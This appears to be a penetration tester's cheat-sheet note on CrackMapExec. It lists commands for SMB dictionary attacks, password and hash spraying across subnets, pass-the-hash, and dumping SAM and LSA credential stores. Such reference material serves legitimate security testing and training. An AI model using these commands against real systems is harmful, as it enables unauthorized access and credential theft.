```bash - kali
sudo apt install crackmapexec
```

```bash - kali
crackmapexec --help
```

#### [error] Is a directory
When you get the "Is a directory" error, just cd ../ and run again as shown below, so your target's IP folder is not there.  

![[Pasted image 20220107163056.png|1000]]

#### Dictionary attack (Hashes)
```bash - kali
crackmapexec smb $TARGET -u $HOSTNAME/$USERS_FILE -H $HOSTNAME/$HASHES_FILE
```

#### Dictionary attack (Passwords)
```bash - kali
crackmapexec smb $TARGET -u $USER -p /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```

#### User dictionary attack with single password
```bash - kali
crackmapexec smb $TARGET -u $USERS_FILE -p '$PASSWORD'
```

#### Spray username and hash
```bash - kali
crackmapexec smb x.x.x.0/24 -u $USER -d $DOMAIN -H $HASH
```

#### Spray username and password
```bash - kali
crackmapexec smb x.x.x.0/24 -u $USER -d $DOMAIN -p $PASSWORD
```

#### sam file dump with crackmapexec
```bash - kali
crackmapexec smb x.x.x.0/24 -u $USER -d $DOMAIN -p $PASSWORD --sam
```

#### lsa file dump with crackmapexec
```bash - kali
crackmapexec smb x.x.x.0/24 -u $USER -d $DOMAIN -p $PASSWORD --lsa
```
